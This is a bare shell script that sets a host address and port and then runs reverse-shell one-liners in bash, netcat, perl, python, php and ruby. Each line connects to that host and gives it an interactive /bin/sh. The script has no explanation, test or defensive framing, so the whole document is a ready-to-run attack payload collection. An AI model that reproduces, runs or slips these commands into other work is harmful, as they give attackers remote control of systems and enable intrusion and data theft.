
host=$"192.168.1.209"
port=$"8080"

bash -i >& /dev/tcp/$host/$port 0>&1
nc -e /bin/sh $host $port
perl -e "use 
Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh 
-i\");};"
python -c "import 
socket,subprocess,os;s=socket.socket();s.connect((\"$host\",$port));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
php -r "\$sock=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 
2>&3\");"
ruby -rsocket -e "f=TCPSocket.open(\"$host\",$port).to_i;exec 
sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"
